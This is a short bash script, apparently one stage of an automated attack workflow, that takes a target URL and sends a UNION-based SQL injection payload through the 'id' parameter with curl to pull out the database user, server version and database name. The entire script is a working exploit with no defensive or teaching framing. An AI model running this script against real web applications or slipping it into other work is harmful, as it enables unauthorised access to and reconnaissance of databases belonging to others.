#!/bin/bash
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"

BASE_URL=$(echo "$ENDPOINT" | sed 's/\?.*$//')

# Assume 3 columns (adjust based on actual column count from union_columns)
curl -s "${BASE_URL}?id=-1' UNION SELECT 1,concat(user(),0x7c,version(),0x7c,database()),3--+-" --max-time 10
